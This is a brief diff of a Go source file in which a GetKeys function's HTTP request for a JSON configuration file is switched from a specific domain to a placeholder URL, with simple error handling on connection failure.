@@ -18,7 +18,7 @@ type Config struct {
 }
 
 func GetKeys() {
-	resp, err := http.Get("https://halfabowlofhummus.xyz/soulkiller/api/cfg.json")
+	resp, err := http.Get("https://somedomain.abc/cfg.json")
 	if err != nil {
 		fmt.Println("Could not establish connection")
 		os.Exit(1)
